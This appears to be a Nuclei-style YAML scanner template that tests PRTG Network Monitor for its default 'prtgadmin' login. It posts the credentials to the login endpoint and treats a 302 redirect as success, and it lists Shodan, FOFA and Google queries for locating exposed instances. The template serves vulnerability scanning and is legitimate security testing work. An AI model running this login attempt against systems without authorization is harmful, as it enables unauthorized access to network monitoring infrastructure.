id: prtg-default-login

info:
  name: PRTG Network Monitor - Hardcoded Credentials
  author: johnk3r
  severity: high
  description: |
    PRTG Network Monitor default login credentials were discovered.
  reference:
    - https://www.paessler.com/manuals/prtg/login
  classification:
    cwe-id: CWE-798
    cpe: cpe:2.3:a:paessler:prtg_network_monitor:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: paessler
    product: prtg_network_monitor
    shodan-query:
      - http.favicon.hash:"-655683626"
      - http.title:"prtg"
    fofa-query:
      - icon_hash="-655683626"
      - title="prtg"
    google-query: intitle:"prtg"
    runzero-match: service["favicon.ico.image.mmh3"] == "-655683626"
  tags: prtg,default-login

http:
  - raw:
      - |
        POST /public/checklogin.htm HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        loginurl=&username={{username}}&password={{password}}

    attack: pitchfork
    payloads:
      username:
        - prtgadmin
      password:
        - prtgadmin

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "OCTOPUS"
          - "/home"
        condition: and

      - type: status
        status:
          - 302

